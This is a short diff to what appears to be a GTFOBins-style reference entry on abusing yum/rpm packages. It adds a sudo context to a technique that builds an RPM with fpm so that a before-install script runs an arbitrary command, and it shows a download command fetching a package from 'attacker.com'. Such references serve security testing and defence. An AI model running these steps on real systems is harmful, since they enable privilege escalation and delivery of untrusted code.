@@ -10,6 +10,8 @@ functions:
       echo /path/to/command >x.sh
       fpm -n x -s dir -t rpm -a all --before-install .x.sh .
       ```
+    contexts:
+      sudo:
   download:
   - code: |-
       yum install http://attacker.com/path/to/input-file.rpm
